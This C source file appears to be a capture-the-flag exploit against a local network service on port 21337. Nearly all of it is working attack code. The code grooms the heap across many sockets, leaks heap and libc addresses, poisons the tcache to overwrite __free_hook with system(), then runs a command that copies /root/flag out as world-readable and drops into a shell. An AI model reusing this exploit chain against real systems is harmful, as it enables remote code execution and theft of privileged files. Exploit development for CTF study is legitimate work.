//gcc 1.c -o main -z noexecstack -fstack-protector-all -pie -z now
#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/shm.h>
#include <malloc.h>

#define MYPORT  21337
#define BUFFER_SIZE 1024
#define OFFSET_HEAP 0x12F50
#define OFFSET_LIBC 0x1EC0D0
#define OFFSET_FREE_HOOK 0x1EEB28
#define OFFSET_SYSTEM 0x55410


int connect_with()
{
	
    int fd = socket(AF_INET,SOCK_STREAM, 0);
    if(fd < 0){
    	perror("socket");
    }
    struct sockaddr_in Socket;
    Socket.sin_family = AF_INET;
    Socket.sin_port = htons(MYPORT);
    Socket.sin_addr.s_addr = inet_addr("127.0.0.1");
 
  if (connect(fd, (const struct sockaddr *) &Socket, sizeof(Socket)) != 0) {
    perror("connect");
  }
    return fd;
}

void sr(int fd)
{
    char sendbuf[BUFFER_SIZE];
    char recvbuf[BUFFER_SIZE];
    while (fgets(sendbuf, sizeof(sendbuf), stdin) != NULL)
    {
        send(fd, sendbuf, strlen(sendbuf),0); ///发送
        if(strcmp(sendbuf,"exit\n")==0)
            break;
        recv(fd, recvbuf, sizeof(recvbuf),0); ///接收
        fputs(recvbuf, stdout);
 
        memset(sendbuf, 0, sizeof(sendbuf));
        memset(recvbuf, 0, sizeof(recvbuf));
    }
}
void writeall(int fd, char *buf, size_t len) {
    size_t towrite = len;
    while (towrite) {
        ssize_t written = write(fd, buf, towrite);
        if (written <= 0) {
            puts("write failure");
            exit(0);
        }
        towrite -= written;
    }
}

void readall(int fd, char *buf, size_t len) {
    size_t toread = len;
    while (toread) {
        ssize_t readden = read(fd, buf, toread);
        if (readden <= 0) {
            puts("read failure");
            exit(0);
        }
        toread -= readden;
    }
}

int main()
{
	int fds[0x10];
	memset(fds,0,0x10*sizeof(int));
	char *buf = malloc(0x10000);
	memset(buf,0,0x10000);
	int i;
	for(i = 1; i < 0x10000/8 ;i+=2)
	{
		*((size_t*)buf+i) = 0x31;
	}
	for(i = 0; i < 0x10 ; i++)
	{
		fds[i] = connect_with();
		usleep(1000);
	}
	write(fds[0],buf,0x10000 - 1);
	for(i = 1; i < 9; i++)
	{
		writeall(fds[i],buf, 0x10000 >> i);
		usleep(1000);
	}
	
	write(fds[13], "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF", 0x20);
    usleep(1000);
    write(fds[14], "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM", 0x20);
    write(fds[15], "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY", 0x20);
    usleep(1000);
    
    close(fds[13]);
    usleep(1000);
    write(fds[15],"\x00",1);
    close(fds[14]);
    usleep(1000);
    fds[13] = connect_with();
    fds[14] = connect_with();
    
    write(fds[13],"PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP",0x20);
    usleep(1000);
    write(fds[14],"QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ",0x20);
    usleep(1000);
    
    close(fds[14]);
    usleep(1000);
    
    write(fds[0],"\n",1);
    do {
        read(fds[0], buf, 1);
    } while(*buf != '\n');
    
    readall(fds[0], buf, 0x10000);
    
    size_t *leak = memmem(buf,0x10000,"QQQQQQQQ",8);
    if(!leak)
    {
    	puts("No HEAP :(");
    	exit(0);
    }
    size_t heap_base = leak[-1];
    printf("HEAP:\t%#lx\n",heap_base);
    
    /////////////////////////////////////////////////
    
    close(fds[15]);
    close(fds[13]);
    usleep(1000);
    fds[13] = connect_with();
    usleep(1000);
    fds[14] = connect_with();
    usleep(1000);
    fds[15] = connect_with();
    
   	write(fds[13], "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF", 0x20);
    usleep(1000);
    write(fds[14], "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM", 0x20);
    usleep(1000);
    write(fds[15], "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY", 0x20);
    usleep(1000);
    
    close(fds[13]);
    usleep(1000);
    
    size_t target = heap_base + OFFSET_HEAP;
    write(fds[15],&target,7);
    close(fds[14]);
    usleep(1000);
    
    fds[13] = connect_with();
    fds[14] = connect_with();
    
    usleep(1000);
    
    write(fds[13],"MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM",0x20);
    ((size_t*)buf)[0] = 0;
    ((size_t*)buf)[1] = 0x811;
    ((size_t*)buf)[2] = 0;
    ((size_t*)buf)[3] = 0;
    usleep(1000);
    write(fds[14], buf, 0x20);
    
    write(fds[5],"\n",1); // free the chunk that its size is 0x811
    
    usleep(1000);
    write(fds[14],"UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\n",0x40);
    usleep(1000);
    do {
        read(fds[14], buf, 1);
    } while(*buf != '\n');
    read(fds[14],buf,0x20);
    usleep(1000);
    if( *((size_t*)buf+1) != 0x71)
    {
    	puts("No LIBC :(");
    	exit(0);
    }
    size_t libc_base = *((size_t*)buf + 3) - OFFSET_LIBC;
    printf("LIBC:\t%#lx\n",libc_base);
	
	size_t free_hook = libc_base + OFFSET_FREE_HOOK;
	size_t SYSTEM = libc_base + OFFSET_SYSTEM;
	
	fds[16] = connect_with();
	usleep(1000);
	fds[17] = connect_with();
	usleep(1000);
	fds[18] = connect_with();
	usleep(1000);
	write(fds[16], "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF", 0x20);
    usleep(1000);
    write(fds[17], "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF", 0x20);
    usleep(1000);
    write(fds[18], "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF", 0x20);
    usleep(1000);
    
    
    close(fds[16]);
    write(fds[18],&free_hook,7);
    close(fds[17]);
    usleep(1000);
    
    fds[16] = connect_with();
    fds[17] = connect_with();
    
    usleep(1000);
    
    write(fds[16],"SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS",0x20);
    usleep(1000);
    write(fds[17],&SYSTEM,0x20);
    
    fds[19] = connect_with();
    usleep(1000);
    write(fds[19],"/bin/cp /root/flag /tmp; /bin/chmod a+r /tmp/flag\0",0x50);
    
    close(fds[19]);
    fflush(stdout);
    system("/bin/sh");
	
	
}
